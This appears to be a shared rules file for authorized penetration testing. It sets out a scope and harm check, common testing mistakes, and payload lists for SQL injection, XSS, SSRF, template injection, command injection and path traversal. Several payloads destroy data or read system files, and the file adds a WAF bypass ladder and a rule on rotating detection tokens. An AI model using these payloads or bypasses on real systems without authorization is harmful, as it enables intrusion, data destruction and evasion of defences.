# Security Rules — Shared Knowledge

## Rule 0: Harm Check
Before executing ANY action, verify:
1. The target is in scope (written authorization or owned)
2. The action won't cause unplanned damage to production systems
3. Sensitive data is handled per rules (stored locally, not transmitted)

## Top 10 Mistakes

1. **Not verifying scope** — Testing outside authorization = liability
2. **Stopping at first finding** — One vuln often reveals siblings (Rule 8)
3. **Ignoring error messages** — Verbose errors = free intel
4. **Trusting client-side validation** — Always test server-side enforcement
5. **Forgetting rate limits** — Brute force needs throttling to avoid lockouts
6. **Not testing authenticated vs unauthenticated** — Auth context changes everything
7. **Ignoring HTTP headers** — CORS, CSP, HSTS, X-Frame-Options all matter
8. **Skipping business logic** — IDOR and access control > technical vulns
9. **Not versioning findings** — Track finding evolution across rounds
10. **Skipping report** — A vuln not reported is a vuln not fixed

## Attack Payload Families

### SQL Injection
```
' OR '1'='1
' UNION SELECT NULL,NULL,NULL--
'; DROP TABLE users--
' AND SLEEP(5)--
1' OR 1=1#
```

### XSS
```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
javascript:alert(1)
"><script>alert(1)</script>
```

### SSRF
```
http://169.254.169.254/latest/meta-data/
http://localhost:8080/admin
gopher://internal:6379/_FLUSHALL
file:///etc/passwd
```

### SSTI
```
{{7*7}}
${7*7}
<%= 7*7 %>
#{7*7}
*{7*7}
{{config}}
{{''.__class__.__mro__[1].__subclasses__()}}
```

### Command Injection
```
; cat /etc/passwd
| id
&& whoami
$(whoami)
`whoami`
; sleep 10
```

### Path Traversal
```
../../../etc/passwd
..\\..\\..\\windows\\win.ini
....//....//....//etc/passwd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
```

## WAF Bypass Ladder

1. **Case variation**: `ScRiPt` → `script`
2. **Encoding**: URL encode, double encode, Unicode
3. **Whitespace alternatives**: `/`, `%0a`, `%0d`, `()` 
4. **Comment insertion**: `/**/` between keywords
5. **Case + encoding combo**: `%3CsCrIpT%3E`
6. **Alternative functions**: `eval`→`Function`, `innerHTML`→`document.write`
7. **Protocol smuggling**: HTTP/2, WebSocket, gRPC
8. **Chunked transfer**: Split payload across chunks
9. **Content-Type confusion**: JSON with XML body, multipart tricks

## Hunting Rules

| Rule | Description |
|:-----|:-----------|
| 0 | Harm check before any action |
| 8 | Sibling check — one vuln often reveals nearby vulns |
| 9 | Signal A→B — finding A should trigger testing for B |
| 19 | Never submit — findings that should be reported privately |
| 24 | Mutation matrix — test all parameter mutations |
| 28 | Detection token rotation — don't reuse identifiable tokens |
| 30 | No cross-region inference — don't test region A to infer region B |
| 31 | Unauth state-change battery — test all state changes unauthenticated |
